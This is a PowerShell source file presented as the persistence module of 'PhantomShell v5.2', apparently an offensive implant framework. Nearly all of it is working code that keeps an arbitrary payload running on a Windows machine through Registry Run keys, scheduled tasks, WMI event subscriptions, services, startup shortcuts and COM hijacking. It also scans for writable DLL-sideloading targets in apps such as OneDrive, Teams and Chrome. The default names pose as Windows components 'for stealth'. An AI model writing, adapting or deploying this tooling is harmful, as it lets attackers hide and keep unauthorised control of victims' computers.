# PhantomShell v5.2 - Persistence Module
# Establishes persistence via registry, scheduled tasks, WMI, services, COM, DLL sideloading

$ModuleCommands = @{
    "persist-reg"       = @{ Handler = { param($a) Add-RegPersistence @a }; Description = "Registry Run/RunOnce persistence" }
    "persist-schtask"   = @{ Handler = { param($a) Add-ScheduledTaskPersistence @a }; Description = "Scheduled task persistence" }
    "persist-wmi"       = @{ Handler = { param($a) Add-WMIPersistence @a }; Description = "WMI event subscription persistence" }
    "persist-service"   = @{ Handler = { param($a) Add-ServicePersistence @a }; Description = "Windows service persistence" }
    "persist-startup"   = @{ Handler = { param($a) Add-StartupFolderPersistence @a }; Description = "Startup folder shortcut" }
    "persist-com"       = @{ Handler = { param($a) Add-COMHijack @a }; Description = "COM object hijack persistence" }
    "find-dll-sideload" = @{ Handler = { param($a) Add-DLLSideload @a }; Description = "Identify DLL sideloading targets" }
}

# --- Registry Run Key ---
function Add-RegPersistence {
    param([hashtable]$Args = @{})
    try {
        $payload = $Args.payload  # command to execute
        $name = if ($Args.name) { $Args.name } else { "WindowsUpdate" }
        $hive = if ($Args.hive) { $Args.hive } else { "HKCU" }
        $runonce = [bool]$Args.runonce

        if (-not $payload) {
            return @{ status = "error"; output = "Required: payload (command string)" }
        }

        $keyPath = if ($runonce) { "$hive\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" }
                   else { "$hive\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" }

        # HKLM requires admin
        if ($hive -eq "HKLM") {
            $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object Security.Principal.WindowsPrincipal($identity)
            if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
                return @{ status = "error"; output = "HKLM requires administrator privileges" }
            }
        }

        $regPath = "Registry::$keyPath"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $name -Value $payload -Force

        # Verify
        $verify = (Get-ItemProperty -Path $regPath).$name

        return @{
            status = "ok"
            output = "Registry persistence set"
            data   = @{
                key     = $keyPath
                name    = $name
                value   = $verify
                runonce = $runonce
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Scheduled Task ---
function Add-ScheduledTaskPersistence {
    param([hashtable]$Args = @{})
    try {
        $payload = $Args.payload
        $taskName = if ($Args.name) { $Args.name } else { "MicrosoftEdgeUpdate" }
        $trigger = if ($Args.trigger) { $Args.trigger } else { "logon" }  # logon, idle, time, daily

        if (-not $payload) {
            return @{ status = "error"; output = "Required: payload" }
        }

        # Parse payload into executable and arguments
        $exe = $payload
        $arguments = ""
        if ($payload -match '^"([^"]+)"\s*(.*)$') {
            $exe = $Matches[1]; $arguments = $Matches[2]
        } elseif ($payload -match '^(\S+)\s+(.+)$') {
            $exe = $Matches[1]; $arguments = $Matches[2]
        }

        # Build schtasks command based on trigger type
        $schArgs = "/create /tn `"$taskName`" /tr `"$payload`" /f"

        switch ($trigger) {
            "logon" {
                $schArgs += " /sc onlogon"
                if ($Args.run_as) { $schArgs += " /ru `"$($Args.run_as)`"" }
            }
            "idle" {
                $schArgs += " /sc onidle /i 10"
            }
            "time" {
                $time = if ($Args.time) { $Args.time } else { "09:00" }
                $schArgs += " /sc once /st $time"
            }
            "daily" {
                $time = if ($Args.time) { $Args.time } else { "09:00" }
                $schArgs += " /sc daily /st $time"
            }
            default {
                $schArgs += " /sc onlogon"
            }
        }

        # Run level
        if ($Args.highest) { $schArgs += " /rl HIGHEST" }

        $result = & schtasks.exe $schArgs.Split(' ') 2>&1 | Out-String

        return @{
            status = "ok"
            output = "Scheduled task created"
            data   = @{
                task_name = $taskName
                trigger   = $trigger
                payload   = $payload
                result    = $result.Trim()
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- WMI Event Subscription ---
function Add-WMIPersistence {
    param([hashtable]$Args = @{})
    try {
        $payload = $Args.payload
        $name = if ($Args.name) { $Args.name } else { "SystemCoreUpdate" }
        $trigger = if ($Args.trigger) { $Args.trigger } else { "startup" }  # startup, logon, interval

        if (-not $payload) {
            return @{ status = "error"; output = "Required: payload" }
        }

        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            return @{ status = "error"; output = "WMI persistence requires administrator privileges" }
        }

        # Event filter WQL query
        $wqlQuery = switch ($trigger) {
            "startup" { "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180" }
            "logon"   { "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2" }
            "interval"{ $intervalSec = if ($Args.interval) { $Args.interval } else { 3600 }; "__InstanceModificationEvent WITHIN $intervalSec WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }
            default   { "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }
        }

        # Create Event Filter
        $filterArgs = @{
            EventNamespace = "root\cimv2"
            Name           = "${name}_Filter"
            QueryLanguage  = "WQL"
            Query          = $wqlQuery
        }
        $filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments $filterArgs

        # Create CommandLine Event Consumer
        $consumerArgs = @{
            Name               = "${name}_Consumer"
            CommandLineTemplate = $payload
        }
        $consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments $consumerArgs

        # Bind filter to consumer
        $bindingArgs = @{
            Filter   = $filter
            Consumer = $consumer
        }
        $binding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments $bindingArgs

        return @{
            status = "ok"
            output = "WMI event subscription created"
            data   = @{
                name     = $name
                trigger  = $trigger
                filter   = $filter.__PATH
                consumer = $consumer.__PATH
                binding  = $binding.__PATH
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Windows Service ---
function Add-ServicePersistence {
    param([hashtable]$Args = @{})
    try {
        $payload = $Args.payload
        $svcName = if ($Args.name) { $Args.name } else { "WindowsCoreRuntime" }
        $displayName = if ($Args.display_name) { $Args.display_name } else { "Windows Core Runtime Service" }
        $startType = if ($Args.start_type) { $Args.start_type } else { "auto" }

        if (-not $payload) {
            return @{ status = "error"; output = "Required: payload (binary path)" }
        }

        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            return @{ status = "error"; output = "Service creation requires administrator privileges" }
        }

        $result = & sc.exe create $svcName binPath= "$payload" DisplayName= "$displayName" start= $startType 2>&1 | Out-String

        # Set description for stealth
        $desc = if ($Args.description) { $Args.description } else { "Provides core runtime services for Windows components." }
        $null = & sc.exe description $svcName "$desc" 2>&1

        # Start the service
        if ($Args.start_now) {
            $null = & sc.exe start $svcName 2>&1
        }

        return @{
            status = "ok"
            output = "Service created"
            data   = @{
                name         = $svcName
                display_name = $displayName
                binary_path  = $payload
                start_type   = $startType
                result       = $result.Trim()
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Startup Folder Shortcut ---
function Add-StartupFolderPersistence {
    param([hashtable]$Args = @{})
    try {
        $payload = $Args.payload
        $name = if ($Args.name) { $Args.name } else { "WindowsSecurityHealth" }
        $allUsers = [bool]$Args.all_users

        if (-not $payload) {
            return @{ status = "error"; output = "Required: payload (target path)" }
        }

        $startupPath = if ($allUsers) {
            [Environment]::GetFolderPath("CommonStartup")
        } else {
            [Environment]::GetFolderPath("Startup")
        }

        if (-not $startupPath) {
            $startupPath = if ($allUsers) {
                "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            } else {
                Join-Path ([Environment]::GetFolderPath("UserProfile")) "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            }
        }

        $lnkPath = Join-Path $startupPath "$name.lnk"

        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = $payload
        if ($Args.arguments) { $shortcut.Arguments = $Args.arguments }
        $shortcut.WorkingDirectory = if ($Args.working_dir) { $Args.working_dir } else { "C:\Windows\System32" }
        $shortcut.WindowStyle = 7  # Minimized
        $shortcut.Description = if ($Args.description) { $Args.description } else { "Windows Security Health Service" }
        $shortcut.Save()

        return @{
            status = "ok"
            output = "Startup shortcut created"
            data   = @{
                path      = $lnkPath
                target    = $payload
                all_users = $allUsers
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- COM Object Hijack ---
function Add-COMHijack {
    param([hashtable]$Args = @{})
    try {
        $payload = $Args.payload  # DLL or script path
        if (-not $payload) {
            return @{ status = "error"; output = "Required: payload (DLL path)" }
        }

        # Well-known hijackable CLSIDs (InprocServer32 or LocalServer32)
        $targetCLSIDs = @{
            "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" = "CLSID_TaskScheduler (explorer.exe loads)"
            "{BCDE0395-E52F-467C-8E3D-C4579291692E}" = "MMDeviceEnumerator (many apps load)"
            "{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}" = "wbemcomn (WMI related)"
        }

        $clsid = if ($Args.clsid) { $Args.clsid } else { "{BCDE0395-E52F-467C-8E3D-C4579291692E}" }
        $description = if ($targetCLSIDs.ContainsKey($clsid)) { $targetCLSIDs[$clsid] } else { "Custom CLSID" }

        # Write to HKCU (per-user, no admin needed)
        $keyPath = "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32"

        if (-not (Test-Path $keyPath)) {
            New-Item -Path $keyPath -Force | Out-Null
        }
        Set-ItemProperty -Path $keyPath -Name "(Default)" -Value $payload -Force
        Set-ItemProperty -Path $keyPath -Name "ThreadingModel" -Value "Both" -Force

        return @{
            status = "ok"
            output = "COM hijack configured"
            data   = @{
                clsid       = $clsid
                description = $description
                dll_path    = $payload
                key_path    = $keyPath
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- DLL Sideload Discovery ---
function Add-DLLSideload {
    param([hashtable]$Args = @{})
    try {
        $searchPath = if ($Args.path) { $Args.path } else { "C:\Program Files" }
        $findings = @()

        # Known sideload-vulnerable applications and their DLLs
        $knownTargets = @(
            @{ Exe = "OneDrive.exe"; DLL = "version.dll"; Vendor = "Microsoft" },
            @{ Exe = "Teams.exe"; DLL = "CRYPTSP.dll"; Vendor = "Microsoft" },
            @{ Exe = "slack.exe"; DLL = "wtsapi32.dll"; Vendor = "Slack" },
            @{ Exe = "chrome.exe"; DLL = "wtsapi32.dll"; Vendor = "Google" },
            @{ Exe = "msedge.exe"; DLL = "wtsapi32.dll"; Vendor = "Microsoft" },
            @{ Exe = "code.exe"; DLL = "WINMM.dll"; Vendor = "Microsoft" }
        )

        # Search for known vulnerable executables
        foreach ($target in $knownTargets) {
            $found = Get-ChildItem -Path $searchPath -Filter $target.Exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($found) {
                $exeDir = $found.DirectoryName
                $dllPath = Join-Path $exeDir $target.DLL
                $writable = $false

                # Check if directory is writable
                try {
                    $testFile = Join-Path $exeDir ".ps_write_test"
                    [IO.File]::WriteAllText($testFile, "test")
                    Remove-Item $testFile -Force
                    $writable = $true
                } catch {}

                $findings += @{
                    executable    = $found.FullName
                    target_dll    = $target.DLL
                    dll_path      = $dllPath
                    dll_exists    = Test-Path $dllPath
                    dir_writable  = $writable
                    vendor        = $target.Vendor
                    exploitable   = ($writable -and -not (Test-Path $dllPath))
                }
            }
        }

        # Also scan for executables that load DLLs not present in their directory
        if ($Args.deep_scan) {
            $exes = Get-ChildItem -Path $searchPath -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 100
            foreach ($exe in $exes) {
                try {
                    # Check PE import table for DLL names
                    $bytes = [IO.File]::ReadAllBytes($exe.FullName)
                    $peOffset = [BitConverter]::ToUInt32($bytes, 0x3C)
                    if ($bytes[$peOffset] -eq 0x50 -and $bytes[$peOffset+1] -eq 0x45) {
                        # Valid PE - look for common hijackable DLL names in imports
                        $content = [Text.Encoding]::ASCII.GetString($bytes)
                        $hijackDlls = @("version.dll","winmm.dll","wtsapi32.dll","dbghelp.dll","dwmapi.dll","uxtheme.dll")
                        foreach ($dll in $hijackDlls) {
                            if ($content -match [regex]::Escape($dll)) {
                                $dllPath = Join-Path $exe.DirectoryName $dll
                                if (-not (Test-Path $dllPath)) {
                                    $findings += @{
                                        executable   = $exe.FullName
                                        target_dll   = $dll
                                        dll_path     = $dllPath
                                        dll_exists   = $false
                                        deep_scan    = $true
                                    }
                                }
                            }
                        }
                    }
                } catch {}
            }
        }

        return @{ status = "ok"; data = $findings; count = $findings.Count }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}
